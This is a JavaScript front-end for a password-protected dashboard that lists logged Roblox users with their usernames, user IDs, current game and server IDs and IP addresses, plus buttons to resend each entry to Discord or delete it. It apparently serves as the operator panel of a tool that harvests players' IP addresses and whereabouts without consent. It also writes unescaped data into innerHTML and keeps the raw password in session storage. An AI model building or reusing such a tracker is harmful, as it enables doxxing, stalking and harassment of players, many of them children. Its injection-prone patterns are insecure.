const authToken = sessionStorage.getItem("auth");

if (authToken) {
  document.getElementById("login").classList.add("hidden");
  document.getElementById("dashboard").classList.remove("hidden");
  fetchLogs();
}

function auth() {
  const password = document.getElementById("password").value;
  fetch("/auth", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password })
  })
    .then(res => res.json())
    .then(data => {
      if (data.message === "Authorized") {
        sessionStorage.setItem("auth", password);
        document.getElementById("login").classList.add("hidden");
        document.getElementById("dashboard").classList.remove("hidden");
        fetchLogs();
      }
    });
}

function fetchLogs() {
  fetch("/logs", {
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  })
    .then(res => res.json())
    .then(data => {
      const container = document.getElementById("logs-container");
      container.innerHTML = "";

      data.forEach(log => {
        const card = document.createElement("div");
        card.className = "log-card";

        card.innerHTML = `
          <img src="${log.thumbnail}" class="thumbnail" />
          <div class="log-info">
            <h2>${log.displayname} (${log.username})</h2>
            <p><strong>User ID:</strong> ${log.userid}</p>
            <p><strong>Game:</strong> ${log.game}</p>
            <p><strong>Place ID:</strong> ${log.placeid}</p>
            <p><strong>Job ID:</strong> ${log.jobid}</p>
            <p><strong>IP Address:</strong> ${log.ip}</p>
            <div class="actions">
              <a href="https://www.roblox.com/users/${log.userid}/profile" target="_blank">Profile</a>
              <a href="https://www.roblox.com/games/${log.placeid}/" target="_blank">Join Game</a>
              <button onclick="resendLog('${log.userid}')">Resend to Discord</button>
              <button onclick="deleteLog('${log.userid}')">Delete</button>
            </div>
          </div>
        `;

        container.appendChild(card);
      });
    });
}

function resendLog(userid) {
  fetch("/send_log/" + userid, {
    method: "POST",
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  }).then(() => fetchLogs());
}

function deleteLog(userid) {
  fetch("/logs/" + userid, {
    method: "DELETE",
    headers: {
      Authorization: "Bearer " + sessionStorage.getItem("auth")
    }
  }).then(() => fetchLogs());
}
